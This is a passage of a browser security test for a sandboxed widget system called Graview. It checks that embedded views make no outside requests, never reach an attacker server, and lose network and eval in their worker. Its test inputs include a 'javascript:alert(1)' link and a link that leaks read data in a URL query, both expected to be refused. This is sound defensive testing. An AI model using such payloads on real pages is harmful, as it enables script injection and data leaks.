    const ran = await guestHeadless.runWorkerViewHeadless({ store: runStore, principal: { kind: "human", id: "u:bethan" }, run: guestNode.nodeIsolate(), manifest: { name: "controls", attach: "car", cardinality: "many" }, source: controlsSource });
    const runTree = ran.ok ? guestHeadless.drawTranscript(ran.transcript.renders, ran.transcript.sheets, { maxNodes: 5_000 }).root : undefined;
    const runAttributes = [];
    const walkRun = (node) => {
      for (const child of node?.childNodes ?? []) {
        if (child.nodeType !== 1) continue;
        runAttributes.push([child.localName, [...child.attributes].filter(([name]) => name !== "autocomplete").sort(([a], [b]) => (a < b ? -1 : 1))]);
        walkRun(child);
      }
    };
    walkRun(runTree);
    claim(
      "the same view run headless says it runs with no problem, and draws element for element and attribute for attribute what the page drew",
      ran.ok && ran.description.problems.length === 0 && JSON.stringify(runAttributes) === JSON.stringify(controlsBefore.attributes),
      ran.ok ? { problems: ran.description.problems, headless: runAttributes.length, page: controlsBefore.attributes.length } : ran,
    );
    const refused = await app.evaluate(() => window.__host.refused().escapes);
    claim("what was not drawn was written down as refused", refused.length >= URL_PROPERTIES.length + 8, { count: refused.length });

    // ── the whole page ──
    /* The page's own: the document, the widget's proxy, and the icon an engine asks the page's origin for. */
    const allowed = new Set([`${HOST}/`, `${GUEST}/proxy/${POLICY}.html`, `${HOST}/favicon.ico`, `${GUEST}/favicon.ico`]);
    const out = requests.filter((url) => /^https?:/.test(url) && !allowed.has(url));
    claim("zero requests left the page from any view's region: the page made none but its own", out.length === 0, out);
    claim("the attacker's server was never asked, nor even connected to", attacker.requests.length === 0 && attacker.connections === 0, attacker);

    // ── the view's own worker ──
    const probed = JSON.parse(await app.evaluate(() => document.querySelector("#prober [data-worker-view]").shadowRoot.querySelector("#probed").textContent));
    claim("inside the view's worker, the network, storage, channels, nested workers and code from text are gone, and graview is kept frozen", Object.values(probed.absent).every(Boolean) && probed.graviewFrozen && probed.graviewKept && probed.replace !== "number" && probed.functionMakesNothing === "EvalError" && probed.stuck.length === 0, probed);
    // ── a view's links out, pressed: after the page's requests are counted, since a link out is a request the person makes ──
    const linked = await app.evaluate(() => {
      const root = document.querySelector("#linker [data-worker-view]").shadowRoot;
      const one = (id) => {
        const anchor = root.getElementById(id);
        return anchor && { href: anchor.getAttribute("href"), target: anchor.getAttribute("target"), rel: anchor.getAttribute("rel"), referrer: anchor.getAttribute("referrerpolicy"), after: getComputedStyle(anchor, "::after").content };
      };
      return { site: one("out-site"), mail: one("out-mail"), leak: one("out-leak"), script: one("out-js") };
    });
    const linkerRefused = await app.evaluate(() => window.__host.refused().linker.filter((one) => one.element === "a").map((one) => one.address));
    claim(
      "a view's link to an address it was handed — the car's own https: page and its dealer's mailto: — is drawn, to open in a new tab, with no opener and no referrer, and an arrow after it",
      linked.site?.href === "https://cars.example/golf" && linked.mail?.href === "mailto:sales@cars.example" && [linked.site, linked.mail].every((one) => one.target === "_blank" && one.rel === "noopener noreferrer" && one.referrer === "no-referrer" && /↗/.test(one.after)),
      linked,
    );
    claim(
      "a view's link to an address it made — the car's page with what the view read added, and javascript: — is drawn with no href, and written down as refused",
      linked.leak?.href === null && linked.script?.href === null && linkerRefused.includes("https://cars.example/golf?read=Golf") && linkerRefused.includes("javascript:alert(1)"),
      { linked, refused: linkerRefused },
    );
    if (!proxied) {
      const linkTree = await tab.accessibility.snapshot({ root: await app.evaluateHandle(() => document.querySelector("#linker [data-worker-view]")), interestingOnly: false });
      const named = [];
      const walkLinks = (node) => {
        for (const child of node?.children ?? []) {
          if (String(child.role).toLowerCase() === "link") named.push(child.name);
          walkLinks(child);
        }
      };
      walkLinks(linkTree);
      claim("each link out is a link in the engine's accessibility tree, and its name says it opens elsewhere", named.length === 2 && named.every((name) => /opens in a new tab|↗/.test(name)), named);
      /* Pressed, it opens in a tab of its own, and this page stays where it was: answered here, so nothing leaves the test. */
      await context.route("https://cars.example/**", (route) => route.fulfill({ status: 200, contentType: "text/html", body: "<!doctype html><title>The Golf</title><p id=there>there</p>" }));
      const [opened] = await Promise.all([context.waitForEvent("page", { timeout: 10_000 }).catch(() => undefined), tab.locator("#linker #out-site").click()]);
      if (opened) await opened.waitForLoadState("load").catch(() => {});
      const there = opened ? await opened.evaluate(() => ({ url: location.href, opener: window.opener === null, referrer: document.referrer })).catch((error) => ({ error: String(error) })) : undefined;
      claim(
        "pressing a link out opens its address in a new tab that has no hold on this page and was told nothing of it, and this page stays where it was",
        there?.url === "https://cars.example/golf" && there.opener === true && there.referrer === "" && tab.url() === `${HOST}/`,
        { there, url: tab.url() },
      );
      await opened?.close().catch(() => {});
    }
    /* The same view run headless, as Graview Cloud's propose_view runs it: the same links drawn, the same two refused and said. */
    const linkStore = new core.Store({ schema: core.createSchema([core.defineNode("car", { fields: core.z.object({ label: core.z.string(), site: core.z.string(), dealer: core.z.string() }), plural: "Cars" })]), mutations: [], policy: { grants: [] }, snapshot: { nodes: [{ id: "car:golf", kind: "car", label: "Golf", site: "https://cars.example/golf", dealer: "mailto:sales@cars.example" }], edges: [] } });
    const linkRun = await guestHeadless.runWorkerViewHeadless({ store: linkStore, principal: { kind: "human", id: "u:bethan" }, run: guestNode.nodeIsolate(), manifest: { name: "linker", attach: "car", cardinality: "many" }, source: linkerSource });
    const linkSaid = linkRun.ok ? linkRun.description.problems.map((problem) => problem.says) : [];
    claim(
      "the same view run headless refuses the same two links and says each — no address it was handed, a scheme no link takes — and nothing else",
      linkRun.ok && linkSaid.length === 2 && linkSaid.some((said) => said.includes('"https://cars.example/golf?read=Golf" was not drawn: it is no address this view was handed')) && linkSaid.some((said) => said.includes('"javascript:alert(1)" was not drawn: a view links only to an https:, mailto: or tel: address')),
      linkRun.ok ? linkSaid : linkRun,
    );
    const failures = await app.evaluate(() => window.__host.failures);
    claim("no view failed", failures.length === 0, failures);
    claim("the page throws nothing", report.pageErrors.length === 0, report.pageErrors);
    report.attacker = attacker;
    report.requests = requests;
  } finally {
    for (const server of servers) server.close();
  }
}
